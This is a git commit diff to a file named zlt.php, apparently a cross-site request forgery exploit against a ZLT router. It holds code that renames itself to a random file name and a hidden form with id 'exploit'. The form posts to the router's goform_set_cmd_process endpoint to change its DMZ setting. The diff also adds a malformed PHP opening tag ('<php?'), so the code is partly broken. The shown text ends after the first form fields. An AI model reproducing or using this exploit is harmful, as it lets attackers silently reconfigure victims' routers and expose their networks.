5378ae4b2686e69cc7ec0cb664f6edcb3d8d86ff
bjcforme <100425721+Hackerownme@users.noreply.github.com>
2024-10-05 19:23:07 +0800

    Update zlt.php

--- zlt.php
+++ zlt.php
@@ -1,10 +1,10 @@
-
+<php?
 $filename = basename(__FILE__, '.html');
 $filename1 = "$filename.html";  
 $generate = bin2hex(random_bytes(5));
 $generate1 = "zlts10g$generate.html"; 
 rename($filename1, $generate1);
-
+?>
 <form method="post" id="exploit" action="http://192.168.254.254/goform/goform_set_cmd_process">
 <input name="goformId" value="DMZ_SETTING" type="hidden">
 <input name="isTest" value="false" type="hidden">
